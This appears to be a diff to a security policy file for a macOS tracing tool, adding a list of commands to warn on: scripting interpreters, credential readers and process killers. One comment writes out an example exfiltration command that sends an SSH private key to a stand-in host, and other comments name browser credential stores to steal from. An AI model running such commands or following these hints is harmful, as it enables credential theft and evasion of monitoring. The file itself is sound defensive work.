@@ -4,6 +4,24 @@ version: 1
 # Each specific policy file includes these sections inline.
 # Reset with: malwi p base
 
+# Warn on dangerous commands that can bypass tracing or exfiltrate data.
+commands:
+  warn:
+    # Scripting interpreters — can execute arbitrary code, bypassing traced process
+    - osascript    # AppleScript/JXA: shell access, file I/O, network via scripting bridge
+    - swift        # Swift interpreter: full system access
+    - java         # JVM: arbitrary code execution, network I/O
+    # Data exfiltration — can leak sensitive data without network hooks seeing it
+    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat ~/.ssh/id_rsa)"
+    - sqlite3      # queries browser credential DBs (Chrome Login Data, Safari, etc.)
+    # Credential/config readers — read secrets from macOS system stores
+    - plutil       # reads plist files: app tokens, Safari data, stored credentials
+    - defaults     # reads macOS preferences: OAuth tokens, login items, app secrets
+    # Anti-tracing — can terminate the malwi agent or CLI process
+    - kill
+    - pkill
+    - killall
+
 # Protect sensitive files from exfiltration.
 files:
   deny:
